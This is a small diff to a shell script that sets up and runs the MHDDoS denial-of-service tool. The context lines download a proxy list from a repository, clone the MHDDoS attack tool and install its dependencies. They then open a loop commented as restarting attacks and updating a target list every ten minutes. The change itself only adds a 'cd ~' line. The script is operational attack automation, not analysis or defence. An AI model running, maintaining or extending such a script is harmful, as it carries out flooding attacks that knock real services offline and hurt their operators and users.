@@ -42,6 +42,7 @@ sudo rm proxies_config.json
 sudo wget https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json
 sudo git clone https://github.com/MHProDev/MHDDoS.git
 sudo python3 -m pip install -r MHDDoS/requirements.txt
+cd ~
 
 # Restart attacks and update targets list every 10 minutes (by default)
 while true
